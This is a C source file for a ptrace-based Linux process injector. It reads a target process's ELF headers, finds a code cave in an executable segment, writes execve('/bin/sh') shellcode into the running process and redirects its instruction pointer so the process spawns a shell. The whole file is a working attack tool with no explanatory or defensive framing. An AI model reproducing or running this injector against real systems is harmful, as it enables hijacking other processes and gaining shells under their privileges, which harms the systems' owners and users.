#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <elf.h>
#include "pmparser.h"

#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/stat.h>

// execve("/bin/sh")
char shellcode[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";

int inject_data(pid_t pid, unsigned char * src, void * dst, int len) {
    uint32_t * s = (uint32_t * ) src;
    uint32_t * d = (uint32_t * ) dst;

    for (int i = 0; i < len; i += 4, s++, d++) {
        if (ptrace(PTRACE_POKETEXT, pid, d, * s) < 0) {
            perror("[</3> ptrace(POKETEXT):");
            return -1;
        }
    }
    return 0;
}

int main(int argc, char * argv[]) {
    pid_t target;
    struct user_regs_struct regs;

    char buffer[256];
    int fd;
    struct stat st;
    uint8_t * data;
    int text_end;
    long long unsigned text_end_ptr = 0;
    Elf64_Ehdr * ehdr;
    Elf64_Phdr * phdr;

    if (argc != 2) {
        printf("[</3] you need to supply 1 pid you dummy! quitting...\n");
        exit(1);
    }

    target = atoi(argv[1]);
    sprintf(buffer, "/proc/%d/exe", target);
    if (stat(buffer, & st) != 0) {
        printf("[</3] couldn't find process! quitting...\n");
        exit(1);
    }
    hr_procmaps ** procmaps = construct_procmaps(target);
    unsigned long long base_address = procmaps[0] -> addr_begin;
    destroy_procmaps(procmaps);

    printf("[*] grabing binary of process %d\n", target);
    if ((fd = open(buffer, O_RDONLY)) < 0) {
        printf("[</3] couldn't open executable of process! quitting...\n");
        exit(1);
    }
    if (fstat(fd, & st) < 0) {
        printf("[</3] couldn't get stats about exectuable! quitting...\n");
        exit(1);
    }

    data = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
    if (data == MAP_FAILED) {
        printf("[</3] couldn't map executable to memory! quitting...\n");
        exit(1);
    }

    ehdr = (Elf64_Ehdr * ) data;
    phdr = (Elf64_Phdr * )(data + ehdr -> e_phoff);

    printf("[*] shellcode length %i\n", strlen(shellcode));
    printf("[*] elf entry point @ 0x%x\n", ehdr -> e_entry);
    for (int i = 0; i < ehdr -> e_phnum; i++) {
        if (phdr[i].p_type == PT_LOAD && phdr[i].p_flags & PF_X) {
            printf("[*] executable load segment @ 0x%x len %i\n", phdr[i].p_vaddr, phdr[i].p_memsz);
            if (phdr[i].p_memsz < strlen(shellcode)) {
                continue;
            }
            text_end_ptr = base_address + ((phdr[i].p_offset + phdr[i].p_filesz));
        }
    }

    if (!text_end_ptr) {
        printf("[</3] couldn't find any large enough codecaves! quitting...\n");
        exit(1);
    }

    printf("[*] tracing process %d\n", target);
    if (ptrace(PTRACE_ATTACH, target, NULL, NULL) < 0) {
        perror("[</3] ptrace(ATTACH):");
        exit(1);
    }
    printf("[<3] process attached!\n");
    printf("[*] waiting for process...\n");
    wait(NULL);

    printf("[*] getting registers\n");
    if (ptrace(PTRACE_GETREGS, target, NULL, & regs) < 0) {
        perror("[</3] ptrace(GETREGS):");
        exit(1);
    }
    printf("[<3] got registers!\n");

    printf("[*] injecting shellcode  at %p\n", (void * ) text_end_ptr);
    if (inject_data(target, shellcode, (void * ) text_end_ptr, sizeof(shellcode) / sizeof(shellcode[0])) < 0) {
        exit(1);
    }

    regs.rip = ((long) text_end_ptr) + 2;
    printf("[*] setting instruction pointer to %p\n", (void * ) regs.rip);
    if (ptrace(PTRACE_SETREGS, target, NULL, & regs) < 0) {
        perror("[</3> ptrace(SETREGS):");
        exit(1);
    }

    printf("[<3] detach from program and run!\n");
    if (ptrace(PTRACE_DETACH, target, NULL, NULL) < 0) {
        perror("[</3] ptrace(DETACH):");
        exit(1);
    }
    return 0;
}